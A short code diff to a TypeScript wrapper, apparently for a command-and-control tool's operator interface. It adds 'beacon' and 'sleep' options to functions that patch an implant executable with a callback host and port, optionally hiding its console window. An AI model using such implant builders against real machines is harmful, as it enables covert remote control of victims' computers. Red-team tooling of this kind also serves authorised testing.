@@ -152,15 +152,18 @@ export async function StopRelay(id: number, relayID: string): Promise<void> {
 // ---- Stub builder ----
 
 // silent selects the GUI-subsystem base exe (no console window on launch).
-export async function BuildStub(host: string, port: string, silent = false): Promise<string> {
-  return app().BuildStub(host, port, silent) // returns base64 exe bytes
+// beacon selects the beacon base exe (auto-reconnecting agent). sleep (>0
+// seconds) is baked into the trailer as the beacon's callback interval
+// (ignored for the stock implant).
+export async function BuildStub(host: string, port: string, silent = false, beacon = false, sleep = 0): Promise<string> {
+  return app().BuildStub(host, port, silent, beacon, sleep) // returns base64 exe bytes
 }
 
-// BuildStubToProject patches the implant exe via the core, then pops the OS
-// "Save As" dialog so the operator picks where to save it. Returns {path} —
+// BuildStubToProject patches the implant/beacon exe via the core, then pops the
+// OS "Save As" dialog so the operator picks where to save it. Returns {path} —
 // path is "" if the operator cancelled. No browser blob download.
-export async function BuildStubToProject(host: string, port: string, name: string, silent = false): Promise<{ path: string }> {
-  const s = await app().BuildStubToProject(host, port, name, silent)
+export async function BuildStubToProject(host: string, port: string, name: string, silent = false, beacon = false, sleep = 0): Promise<{ path: string }> {
+  const s = await app().BuildStubToProject(host, port, name, silent, beacon, sleep)
   return JSON.parse(s)
 }
 
